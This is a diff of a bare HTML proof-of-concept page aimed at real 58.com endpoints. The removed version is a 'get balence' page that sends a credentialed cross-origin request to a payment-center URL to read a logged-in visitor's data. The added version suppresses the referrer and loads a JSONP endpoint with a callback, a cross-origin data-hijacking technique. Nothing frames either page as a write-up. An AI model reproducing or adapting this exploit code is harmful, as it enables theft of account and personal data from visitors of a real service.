@@ -1,24 +1,8 @@
-<!DOCTYPE html>
-<html>
-<body>
-<div id="demo">
-<h1> get balence </h1>
-<button type="button" onclick="loadDoc()">click me</button>
 
-</div>
-<script>
-function loadDoc() {
-  var xhttp = new XMLHttpRequest();
-  xhttp.onreadystatechange = function() {
-    if (this.readyState == 4 && this.status == 200) {
-      document.getElementById("demo").innerHTML =
-      this.responseText;
-    }
-  };
-  xhttp.withCredentials=true;
-  xhttp.open("GET","https://paycenter.58.com/wb/bidflow/?transType=50&bidsign=0&&userId=8&sign=&merType=",true)
-  xhttp.send();
-}
-</script>
-</body>
+<html>
+<head>
+<meta name="referrer" content="no-referrer" />
+</head>
+
+<script src="https://jllist.58.com/hx/downloadlist?pageindex=1&feedbacktype=-1&keyword=&hrTel=-1&targetuid=undefined&fontKey=303c7f19263d43b1b94c5c7539a74f70&callback=jsonp1661002081608_3" ></script>
 </html>
